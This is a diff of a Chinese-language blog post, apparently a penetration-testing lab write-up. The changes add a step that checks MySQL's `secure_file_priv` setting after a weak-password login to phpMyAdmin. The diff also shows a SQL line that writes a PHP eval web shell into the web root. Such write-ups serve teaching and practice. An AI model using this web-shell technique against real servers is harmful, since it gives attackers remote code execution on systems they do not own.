@@ -34,8 +34,9 @@
 <meta property="og:image" content="https://q1ng-li.github.io/images/image-20260317163513081.png">
 <meta property="og:image" content="https://q1ng-li.github.io/images/image-20260317163536137.png">
 <meta property="og:image" content="https://q1ng-li.github.io/images/image-20260317173442877.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image_20240735-133532-a90d8fcd5e99e1bcedf6d326097fea7e.png">
 <meta property="article:published_time" content="2026-03-17T02:41:46.000Z">
-<meta property="article:modified_time" content="2026-03-17T10:01:00.680Z">
+<meta property="article:modified_time" content="2026-03-17T10:54:08.162Z">
 <meta property="article:author" content="q1ng">
 <meta property="article:tag" content="渗透测试">
 <meta name="twitter:card" content="summary">
@@ -273,7 +274,13 @@
 <p><img src="/./images/image-20260317163536137.png" alt="image-20260317163536137"></p>
 <p>（这里卡了很久，原因是我的docker phpMyAdmin 容器只在 Docker 自己的虚拟内网里开放了端口，并没有映射到宿主机,可能是端口占用了）</p>
 <p><img src="/./images/image-20260317173442877.png" alt="image-20260317173442877"></p>
-<p>然后访问phpMyAdmin 弱口令读取，查询flag即可，利用可以直接写入shell.php</p>
+<p>然后访问phpMyAdmin 弱口令读取，查询flag即可</p>
+<p>首先，先检查安全参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">show global variables like &#x27;%secure%&#x27;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./images/image_20240735-133532-a90d8fcd5e99e1bcedf6d326097fea7e.png" alt="img"></p>
+<p>可以看到 <code>secure_file_priv</code> 变量为空，可以任意指定文件的位置</p>
+<p>利用可以直接写入shell.php</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select &#x27;&lt;?php eval($_POST[0]);?&gt;&#x27; into outfile  &#x27;/var/www/html/shell.php&#x27;;<br></code></pre></td></tr></table></figure>
 
 
